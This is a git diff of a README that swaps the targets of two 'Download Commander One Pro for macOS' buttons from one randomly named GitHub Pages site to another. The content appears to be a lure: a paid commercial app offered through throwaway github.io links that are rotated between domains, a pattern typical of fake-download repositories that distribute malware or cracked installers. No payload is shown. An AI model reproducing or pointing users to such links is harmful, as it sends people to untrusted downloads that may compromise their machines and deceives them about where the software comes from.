@@ -10,7 +10,7 @@
 
 <div align="center">
 
-[![📥 Download Commander One Pro for macOS](https://img.shields.io/badge/📥_Download_Commander_One_Pro_for_macOS-blue?style=for-the-badge&logo=apple)](https://kiakodkfi3.github.io/.github/commander-one-pro)
+[![📥 Download Commander One Pro for macOS](https://img.shields.io/badge/📥_Download_Commander_One_Pro_for_macOS-blue?style=for-the-badge&logo=apple)](https://junimata-orex.github.io/.github/commander-one)
 
 </div>
 
@@ -84,7 +84,7 @@ Whether you need to sync large amounts of data, transfer files over FTP, organiz
 
 <div align="center">
 
-[![📥 Download Commander One Pro for macOS](https://img.shields.io/badge/📥_Download_Commander_One_Pro_for_macOS-blue?style=for-the-badge&logo=apple)](https://kiakodkfi3.github.io/.github/commander-one-pro)
+[![📥 Download Commander One Pro for macOS](https://img.shields.io/badge/📥_Download_Commander_One_Pro_for_macOS-blue?style=for-the-badge&logo=apple)](https://junimata-orex.github.io/.github/commander-one)
 
 </div>
 
